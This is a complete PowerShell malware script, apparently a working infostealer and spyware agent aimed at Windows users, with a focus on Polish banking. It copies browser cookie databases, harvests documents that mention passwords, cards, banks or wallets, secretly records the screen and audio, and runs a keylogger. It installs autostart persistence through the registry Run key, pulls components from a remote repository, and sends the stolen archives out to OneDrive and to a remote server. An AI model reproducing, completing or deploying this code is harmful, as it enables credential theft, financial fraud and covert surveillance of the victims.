# luna.ps1 - PowerShell Agent: Cookies, Files, Video, Keylogger, AutoStart

$serverUrl = "https://onclick-back.onrender.com"
$tempDir = "$env:TEMP\luna"
$cookieDir = "$tempDir\cookies"
$fileDumpDir = "$tempDir\files"
$videoSubDir = "$tempDir\video"
$logPath = "$tempDir\log.json"
$keylogPath = "$tempDir\keylog.txt"
$recordingDir = "$env:USERPROFILE\luna_video_fragments"

New-Item -ItemType Directory -Force -Path $tempDir, $cookieDir, $fileDumpDir, $recordingDir, $videoSubDir | Out-Null


Start-Transcript -Path "$tempDir\session.log" -Append


function Collect-Cookies {
    $targets = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data",
        "$env:APPDATA\Mozilla\Firefox\Profiles",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    )
    $patterns = @("*Cookies*", "*.sqlite", "*.ldb", "*.log")

    foreach ($root in $targets) {
        if (Test-Path $root) {
            Get-ChildItem -Path $root -Recurse -Include $patterns -File -ErrorAction SilentlyContinue |
            Where-Object { $_.Length -gt 0 } |
            ForEach-Object {
                try {
                    $safeName = [IO.Path]::GetFileName($_.FullName) -replace '[^\w\d\-_\.]', '_'
                    Copy-Item $_.FullName "$cookieDir\$safeName" -Force -ErrorAction Stop
                } catch {}
            }
        }
    }
}

function Collect-Files {
    $targets = @("Desktop", "Documents", "Downloads") | ForEach-Object { "$env:USERPROFILE\$_" }
    $extensions = "*.pdf", "*.doc*", "*.xls*", "*.txt"
    $keywords = @("haslo", "login", "password", "secret", "bank", "karta", "card", "visa", "dane", "konto", "portfel", "millenium", "pko", "pekao", "sber", "wallet")
    $maxSize = 5MB


    foreach ($dir in $targets) {
        foreach ($ext in $extensions) {
            Get-ChildItem -Path $dir -Recurse -Include $ext -File -ErrorAction SilentlyContinue | ForEach-Object {
                $file = $_
                if ($file.Length -le $maxSize -and $file.Name) {
                    try {
                        $content = Get-Content $file.FullName -ErrorAction SilentlyContinue -Raw -Encoding UTF8
                        foreach ($kw in $keywords) {
                            if ($content -match $kw) {
                                $safeName = $file.Name -replace '[^\w\d\-_\.]', '_'
                                Copy-Item $file.FullName "$fileDumpDir\$safeName" -Force -ErrorAction Stop
                                break
                            }
                        }
                    } catch {}
                }
            }
        }
    }

}

function Get-AudioDevice {
    $ffmpeg = "$PSScriptRoot\ffmpeg.exe"
    $raw = & $ffmpeg -list_devices true -f dshow -i dummy 2>&1
    $devices = @()

    foreach ($line in $raw) {
        if ($line -match '^\[dshow @.*?\] +"(.+?)"\s+\(audio\)') {
            $devices += $matches[1]
        }
    }

    if ($devices.Count -eq 0) {
        Write-Warning "No audio devices found."
        return $null
    }

    $preferred = @("CABLE", "Stereo", "Mix", "Virtual", "Line", "Microphone", "Input")
    foreach ($keyword in $preferred) {
        foreach ($device in $devices) {
            if ($device -like "*$keyword*") {
                return "`"$device`""
            }
        }
    }

    return "audio=`"$($devices[0])`""
}






function Start-Recording {
    $ffmpeg = "$PSScriptRoot\ffmpeg.exe"
    $recordingDir = "$env:USERPROFILE\luna_video_fragments"
    if (!(Test-Path $recordingDir)) {
        New-Item -ItemType Directory -Path $recordingDir -Force | Out-Null
    }

    $audioDevice = Get-AudioDevice
    $file = "$recordingDir\frag_$(Get-Date -Format 'yyyyMMdd_HHmmss').mp4"

    $args = @(
        "-y",
        "-f", "gdigrab", "-framerate", "15", "-i", "desktop"
    )

    if ($audioDevice) {
        $args += @("-f", "dshow", "-i", "audio=$audioDevice")
        $args += @("-map", "0:v:0", "-map", "1:a:0")
        $args += @(
            "-vcodec", "libx264", "-preset", "veryfast",
            "-acodec", "aac", "-ar", "44100", "-b:a", "128k"
        )
    } else {
        Write-Warning "No audio device available, recording video only."
        $args += @("-map", "0:v:0", "-an")
        $args += @("-vcodec", "libx264", "-preset", "veryfast")
    }

    $args += @("-t", "60", "$file")

    Write-Output "Launching ffmpeg..."
    Write-Output "FFmpeg arguments: $($args -join ' ')"

    try {
        $process = Start-Process -FilePath $ffmpeg -ArgumentList $args -WindowStyle Hidden -PassThru
        $global:ffmpegProcess = $process
        Write-Output "ffmpeg started with PID: $($process.Id)"

        $timeout = 60
        while ($timeout -gt 0 -and !(Test-Path $file)) {
            Start-Sleep -Seconds 1
            $timeout--
        }


        if (Test-Path $file) {
            Write-Output "Recording file created: $file"
        } else {
            Write-Warning "Recording file not created. Possible input error."
        }

        return $file
    } catch {
        Write-Warning "Failed to start recording: $_"
        return
    }

}





function Wait-Recording {
    try {
        if ($global:ffmpegProcess -and !$global:ffmpegProcess.HasExited) {
            Write-Output "Waiting for ffmpeg (PID $($global:ffmpegProcess.Id)) to finish..."
            $global:ffmpegProcess.WaitForExit()
            Write-Output "Recording finished."
        } else {
            Write-Warning "ffmpeg process is not active."
        }
    } catch {
        Write-Warning "Wait-Recording exception: $_"
    }
}


function Stop-Recording {
    try {
        Get-Process -Name "ffmpeg" -ErrorAction SilentlyContinue | Stop-Process -Force
        Start-Sleep -Seconds 3 
        Write-Output "Recording stopped"
    } catch {
        Write-Warning "Failed to stop recording: $_"
    }
}






"" | Out-File -Encoding utf8 -Force $keylogPath
Start-Job -ScriptBlock {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -TypeDefinition '
        using System; using System.Runtime.InteropServices;
        public class KeyLogger {
            [DllImport("User32.dll")] public static extern short GetAsyncKeyState(Int32 vKey);
        }'
    $map = @{ 8 = "[Back]"; 13 = "[Enter]"; 32 = " "; 27 = "[Esc]"; 9 = "[Tab]" }
    $logPath = "$env:TEMP\luna\keylog.txt"
    while ($true) {
        for ($i = 1; $i -le 255; $i++) {
            if ([KeyLogger]::GetAsyncKeyState($i) -eq -32767) {
                $char = try { if ($map[$i]) { $map[$i] } else { [char]$i } } catch { "[?]" }
                Add-Content -Path $logPath -Value $char -NoNewline -Encoding utf8
            }
        }
        Start-Sleep -Milliseconds 50
    }
}


function Ensure-Autostart {
    $path = "$env:APPDATA\Microsoft\Windows\luna"
    $repo = "https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/luna"
    $files = @("luna.ps1", "rclone.exe", "rclone.conf", "ffmpeg.exe", "luna_launcher.bat", "setup.vbs", "luna_launcher.vbs")

    if (!(Test-Path $path)) {
        New-Item -ItemType Directory -Path $path -Force | Out-Null
    }

    foreach ($f in $files) {
        $dest = "$path\$f"
        if (!(Test-Path $dest)) {
            try {
                Invoke-WebRequest "$repo/$f" -OutFile $dest -UseBasicParsing
                Write-Output "Downloaded: $f"
            } catch {
                Write-Warning ("Failed to download {0}: {1}" -f $f, $_.Exception.Message)
            }
        }
    }

    $vbsLauncher = "$path\luna_launcher.vbs"
    if (Test-Path $vbsLauncher) {
        try {
            Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
                -Name "luna" -Value $vbsLauncher -ErrorAction Stop
            Write-Output "Autostart via VBS registered: $vbsLauncher"
        } catch {
            Write-Warning ("Failed to set autostart: {0}" -f $_.Exception.Message)
        }
    } else {
        Write-Warning "Launcher VBS not found: $vbsLauncher"
    }
}

$sentLog = "$env:TEMP\luna\sent_files.log"

function Is-NewFile($path) {
    if (!(Test-Path $sentLog)) { return $true }
    $hash = Get-FileHash $path -Algorithm SHA256 | Select-Object -ExpandProperty Hash
    return -not (Select-String -Path $sentLog -Pattern $hash -Quiet)
}

function Mark-AsSent($path) {
    $hash = Get-FileHash $path -Algorithm SHA256 | Select-Object -ExpandProperty Hash
    Add-Content -Path $sentLog -Value $hash
}

function Archive-And-Report {
    $global:archiveSuccess = $false
    $videoSubDir = "$tempDir\video"
    New-Item -ItemType Directory -Path $videoSubDir -Force -ErrorAction SilentlyContinue | Out-Null
    $remote = "onedrive:luna_uploads/$username"
    $rclone = "$env:APPDATA\Microsoft\Windows\luna\rclone.exe"
    
    if (Test-Path $rclone) {
        try {
            & $rclone copy "$zipPath" "$remote" --config "$env:APPDATA\Microsoft\Windows\luna\rclone.conf" --transfers 1 --quiet
            Write-Output "Upload to OneDrive completed: $remote"
        } catch {
            Write-Warning "Upload failed: $_"
        }
    } else {
        Write-Warning "rclone.exe not found at $rclone"
    }

    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $user = $env:USERNAME
    $recordingDir = "$env:USERPROFILE\luna_video_fragments"
    $zipPath = "$env:USERPROFILE\luna_${user}_$timestamp.zip"
    $meta = "$tempDir\info.txt"
    $report = @{ user = $user; host = $env:COMPUTERNAME; timestamp = $timestamp }

    try {
        $report | ConvertTo-Json -Depth 5 | Set-Content -Path $logPath -Encoding utf8
        "System: $user@$env:COMPUTERNAME`nDate: $timestamp" | Set-Content $meta

        if (Test-Path $recordingDir) {
            Get-ChildItem $recordingDir -Filter *.mp4 -File -ErrorAction SilentlyContinue | ForEach-Object {
                Copy-Item $_.FullName "$videoSubDir\$($_.Name)" -Force -ErrorAction SilentlyContinue
            }
        }

        $pathsToArchive = @()

        if (Test-Path $cookieDir) {
            $pathsToArchive += Get-ChildItem $cookieDir -Recurse -File -ErrorAction SilentlyContinue
        }

        if (Test-Path $fileDumpDir) {
            $pathsToArchive += Get-ChildItem $fileDumpDir -Recurse -File -ErrorAction SilentlyContinue
        }

        if (Test-Path $videoSubDir) {
            $pathsToArchive += Get-ChildItem $videoSubDir -Recurse -File -ErrorAction SilentlyContinue
        }

        foreach ($staticFile in @($logPath, $meta, $keylogPath)) {
            if (Test-Path $staticFile) {
                $pathsToArchive += Get-Item $staticFile
            }
        }
        foreach ($dir in @($cookieDir, $fileDumpDir, $videoSubDir)) {
            if (Test-Path $dir) {
                $pathsToArchive += Get-ChildItem $dir -Recurse -File -ErrorAction SilentlyContinue
            }
        }

        $pathsToArchive = $pathsToArchive | Where-Object {
            $_ -and (Test-Path $_.FullName) -and !(Test-Path $_.FullName -PathType Container)
        } | Select-Object -ExpandProperty FullName -Unique

        Start-Sleep -Seconds 2


        if ($pathsToArchive.Count -eq 0) {
            Write-Warning "Nothing to archive - skipping archive/report"
            return
        }

        Write-Output "Collected files:"
        $pathsToArchive | ForEach-Object { Write-Output "t$_" }

        Compress-Archive -Path $pathsToArchive -DestinationPath $zipPath -Force
        Write-Output "Archive created: $zipPath"

        & "$PSScriptRoot\rclone.exe" copy "$zipPath" "onedrive:luna_uploads/$user/$timestamp/" --config "$PSScriptRoot\rclone.conf" --quiet

            try {
                (Get-Item $zipPath).Attributes += 'Hidden'
                Get-ChildItem "$env:USERPROFILE" -Filter "luna_*.zip" |
                    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-2) } |
                    Remove-Item -Force -ErrorAction SilentlyContinue
            } catch {
                Write-Warning "Failed to hide or clean old archives: $_"
            }


        if ($LASTEXITCODE -ne 0) {
            try {
                $stream = [System.IO.File]::OpenRead($zipPath)
                $buffer = New-Object byte[] $stream.Length
                $stream.Read($buffer, 0, $buffer.Length) | Out-Null
                $stream.Close()

                $base64 = [System.Convert]::ToBase64String($buffer)
                $body = @{
                    data = $base64
                    filename = [IO.Path]::GetFileName($zipPath)
                } | ConvertTo-Json -Compress -Depth 5

                Invoke-RestMethod -Uri "$serverUrl/screenshot-archive" -Method POST -Body $body -ContentType "application/json"
            } catch {
                Write-Warning "Failed to send archive backup via POST: $_"
            }
        }


        $filesList = if (Test-Path $fileDumpDir) { Get-ChildItem $fileDumpDir -Recurse -ErrorAction SilentlyContinue } else { @() }
        $cookiesList = if (Test-Path $cookieDir) { Get-ChildItem $cookieDir -Recurse -ErrorAction SilentlyContinue } else { @() }

        if (Test-Path $fileDumpDir) {
            $filesCount = $filesList.Count
        } else {
            $filesCount = 0
        }

        if (Test-Path $cookieDir) {
            $cookiesCount = $cookiesList.Count
        } else {
            $cookiesCount = 0
        }


        $summary = @"
PowerShell Identity Report
User: $user
Machine: $env:COMPUTERNAME
Time: $timestamp
Files: $filesCount
Cookies: $cookiesCount
Cloud path: onedrive:luna_uploads/$user/$timestamp/
Local archive: $zipPath
"@

        $json = @{ text = $summary } | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri "$serverUrl/report" -Method POST -Body $json -ContentType "application/json"

    } catch {
        Write-Warning "Archive or report failed: $_"
    }
}


function Cleanup {
    try {
        Remove-Item "$tempDir\*" -Recurse -Force -ErrorAction SilentlyContinue
        Write-Output "Temp cleaned"
    } catch {
        Write-Warning "Cleanup failed: $_"
    }
}

while ($true) {
    Collect-Cookies
    Collect-Files
    Ensure-Autostart
    $file = Start-Recording
    Write-Output "Waiting for recording to finish..."
    Wait-Recording
    Write-Output "Recording done, proceeding to archive"
    Archive-And-Report
    if ($global:archiveSuccess) {
        Cleanup
    }
    Start-Sleep -Seconds 10
}





Stop-Transcript